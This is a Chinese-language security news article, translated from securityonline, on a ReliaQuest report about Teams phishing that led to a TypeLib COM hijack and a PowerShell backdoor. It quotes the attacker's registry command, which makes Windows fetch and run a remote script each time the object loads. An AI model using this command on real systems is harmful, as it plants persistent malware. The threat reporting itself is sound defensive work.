---
title: Microsoft Teams 新型恶意攻击：TypeLib 劫持恶意软件或引发安全风暴
url: https://www.anquanke.com/post/id/306633
source: 安全客-有思想的安全新媒体
date: 2025-04-18
fetch_date: 2025-10-06T22:02:47.667219
---

# Microsoft Teams 新型恶意攻击：TypeLib 劫持恶意软件或引发安全风暴

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# Microsoft Teams 新型恶意攻击：TypeLib 劫持恶意软件或引发安全风暴

阅读量**62019**

发布时间 : 2025-04-17 14:18:51

**x**

##### 译文声明

本文是翻译文章，文章原作者 securityonline，文章来源：securityonline

原文地址：<https://securityonline.info/novel-attack-uses-teams-phishing-and-zero-day-typelib-hijacking/>

译文仅供参考，具体内容表达以及含义原文为准。

在社会工程学手段和维持控制技术令人担忧地升级的情况下，网络安全公司 ReliaQuest 发现了一场新的后门恶意软件攻击活动。该活动始于对 Microsoft Teams 的网络钓鱼攻击，并升级到使用一种全新的 COM 类型库（TypeLib）劫持技术 —— 这是一种此前在现实环境中从未被发现过的维持控制的方法。

此次攻击是在对金融和专业服务领域的事件响应调查中发现的，与 Storm – 1811（又名 STAC5777）威胁组织早期策略的手法相似，该组织以传播 Black Basta 勒索软件而闻名，但此次攻击引入了全新的行为和工具，这表明要么是该组织有了新的发展，要么是出现了分支。

ReliaQuest 称：“我们发现了一种此前未被报道过的利用 TypeLib COM 劫持的维持控制方法，以及一个新的 PowerShell 后门。”

这场攻击活动始于通过 Microsoft Teams 发送的网络钓鱼信息，攻击者使用一个虚假的租户伪装成信息技术支持人员，该租户的邮箱为：techsupport [at] sma5smg.sch [.] id。

这些网络钓鱼尝试的独特之处在于其精准的目标定位：

1.信息发送时间选在下午 2 点到 3 点之间，利用了午餐后的松懈时段。

2.目标仅针对企业高管和拥有高权限的员工。

3.受害者的名字听起来是女性，这暗示攻击者可能根据网络钓鱼易感性研究对人群进行了人口统计学分析。

ReliaQuest 的分析师指出：“这不是广撒网式的攻击，而是针对有权力和访问权限的人进行的精准打击。”

一旦获取了受害者的信任，攻击者就会使用 Windows Quick Assist 来建立远程访问权限 —— 无缝地融入到合法的信息技术支持工作流程中。

在获得访问权限后，攻击者执行了一种新的维持控制方法，涉及对与 Internet Explorer 相关的 COM 对象进行 TypeLib 劫持。

报告解释称：“当 Explorer.exe 引用这个被劫持的对象时，恶意软件就会被下载并执行 —— 即使系统重启，恶意软件也会持续存在。”

此次劫持利用了以下注册表修改：

reg add “”HKEY\_CURRENT\_USER\Software\Classes\TypeLib{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}\1.1\0\win64″” /t REG\_SZ /d “script:hxxps://drive.google[dot]com/uc?export=download^&id=1l5cMkpY9HIERae03tqqvEzCVASQKen63” /f

这个命令指示 Windows 在每次访问该 COM 对象时，下载并执行一个远程脚本，甚至当像 Explorer.exe 这样的 Windows 核心进程访问时也会执行。

安全研究人员之前曾讨论过 TypeLib 劫持，但这是首次确认在现实环境中被利用的案例。

被托管的文件（5.txt）包含了经过深度混淆处理的 JScript + PowerShell 代码，这些代码被包裹在一些误导性的、以太空为主题的垃圾变量中，如 “Galaxy”、“Orion”和 “Cosmos”。

一旦解密，PowerShell 有效载荷会：

1.提取系统的硬盘序列号。

2.创建一个唯一的信标 URL。

3.维持一个无限的命令与控制（C2）循环。

4.使用互斥锁来避免重复执行。

5.绕过 PowerShell 执行策略。

6.向一个 Telegram 机器人报告成功情况，确认C2连接已建立。

![TypeLib Hijacking, Microsoft Teams Phishing]()

图片来源： ReliaQuest

ReliaQuest 观察到：“在撰写本文时，该文件在 VirusTotal 上的恶意评分很低，这意味着它很可能会逃过检测。”

ReliaQuest 将该恶意软件的早期版本追溯到 2025 年 1 月，当时它是通过针对搜索 Microsoft Teams 的用户的恶意 Bing 广告进行传播的。这些早期版本没有进行混淆处理，并且使用本地主机 IP 进行测试，这暗示了其分阶段的开发过程。

有趣的是，该恶意软件使用的 Telegram 机器人日志包含俄语语法，这进一步加深了人们对开发者讲俄语的怀疑。

尽管此次攻击在基础设施和代码方面与早期的 Bing 广告活动存在重叠，但 ReliaQuest 认为，这次新的攻击活动可能与 Black Basta 或 Storm-1811没有直接关联。

报告总结道：“实际上，很有可能是另一个组织对最近的这次攻击活动负责。”

本文翻译自securityonline [原文链接](https://securityonline.info/novel-attack-uses-teams-phishing-and-zero-day-typelib-hijacking/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306633](/post/id/306633)

安全KER - 有思想的安全新媒体

本文转载自: [securityonline](https://securityonline.info/novel-attack-uses-teams-phishing-and-zero-day-typelib-hijacking/)

如若转载,请注明出处： <https://securityonline.info/novel-attack-uses-teams-phishing-and-zero-day-typelib-hijacking/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**4赞

收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p3.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)